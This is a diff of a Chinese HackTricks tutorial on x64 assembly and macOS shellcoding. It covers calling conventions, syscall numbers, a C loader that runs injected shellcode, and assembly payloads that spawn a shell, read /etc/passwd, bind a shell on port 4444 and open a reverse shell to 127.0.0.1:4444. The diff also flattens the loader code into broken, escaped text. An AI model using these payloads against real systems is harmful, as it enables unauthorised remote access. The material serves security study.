@@ -1,4 +1,4 @@
-# x64简介
+# Introduction to x64
 
 <details>
 
@@ -9,7 +9,7 @@
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
@@ -35,8 +35,8 @@ x64扩展了x86架构，具有**16个通用寄存器**，标记为`rax`、`rbx`�
 
 x64的调用约定在操作系统之间有所不同。例如：
 
-* **Windows**：前**四个参数**通过寄存器**`rcx`**、**`rdx`**、**`r8`**和**`r9`**传递。额外的参数被推送到栈上。返回值在**`rax`**中。
-* **System V（在类UNIX系统中常用）**：前**六个整数或指针参数**通过寄存器**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**和**`r9`**传递。返回值也在**`rax`**中。
+* **Windows**：前**四个参数**通过寄存器\*\*`rcx`**、**`rdx`**、**`r8`**和**`r9`**传递。额外的参数被推送到栈上。返回值在**`rax`\*\*中。
+* **System V（在类UNIX系统中常用）**：前**六个整数或指针参数**通过寄存器\*\*`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**和**`r9`**传递。返回值也在**`rax`\*\*中。
 
 如果函数有超过六个输入，则**其余参数将通过栈传递**。**RSP**，即栈指针，必须是**16字节对齐**，这意味着在进行任何调用之前，它指向的地址必须能被16整除。这意味着通常我们需要确保我们的shellcode在进行函数调用之前RSP被正确对齐。然而，在实践中，即使不满足这一要求，系统调用也经常能够正常工作。
 
@@ -76,11 +76,13 @@ x64指令具有丰富的集合，保持与早期x86指令的兼容性并引入�
 1. **将当前基指针移动到栈指针**：`mov rsp, rbp`（释放本地变量）
 2. **从栈中弹出旧的基指针**：`pop rbp`（恢复调用者的基指针）
 3. **返回**：`ret`（将控制返回给调用者）
+
 ## macOS
 
 ### 系统调用
 
 有不同类别的系统调用，你可以[**在这里找到它们**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,9 @@ x64指令具有丰富的集合，保持与早期x86指令的兼容性并引入�
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
+
 然后，您可以在[**此网址**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**中找到每个系统调用号：**
+
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,6 +110,7 @@ x64指令具有丰富的集合，保持与早期x86指令的兼容性并引入�
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
+
 因此，为了从**Unix/BSD类**调用`open`系统调用（**5**），您需要将其添加为：`0x2000000`
 
 因此，调用open的系统调用号将是`0x2000005`
@@ -138,59 +143,42 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 <details>
 
 <summary>用于测试shellcode的C代码</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### Shell
 
 取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行解释。
 
-{% tabs %}
-{% tab title="使用 adr" %}
+<div data-gb-custom-block data-tag="tabs">
+
+<div data-gb-custom-block data-tag="tab" data-title='使用 adr'>
+
 ```armasm
 bits 64
 global _main
@@ -204,10 +192,8 @@ push    59                ; put 59 on the stack (execve syscall)
 pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
-```
-{% endtab %}
+````
 
-{% tab title="使用堆栈" %}
 ```armasm
 bits 64
 global _main
@@ -223,12 +209,11 @@ pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
 ```
-{% endtab %}
-{% endtabs %}
 
-#### 使用 cat 命令读取
+**使用 cat 命令读取**
 
 目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数 (x1) 是一个参数数组 (在内存中意味着地址的堆栈)。
+
 ```armasm
 bits 64
 section .text
@@ -259,7 +244,9 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### 使用 sh 调用命令
+
+**使用 sh 调用命令**
+
 ```armasm
 bits 64
 section .text
@@ -297,9 +284,11 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### 绑定 shell
+
+**绑定 shell**
 
 绑定 shell 来自 [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) 在 **端口 4444** 上。
+
 ```armasm
 section .text
 global _main
@@ -374,9 +363,11 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### 反向Shell
+
+**反向Shell**
 
 从[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)获取反向shell。反向shell连接到**127.0.0.1:4444**
+
 ```armasm
 section .text
 global _main
@@ -438,16 +429,7 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-<details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-支持HackTricks的其他方式：
-
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
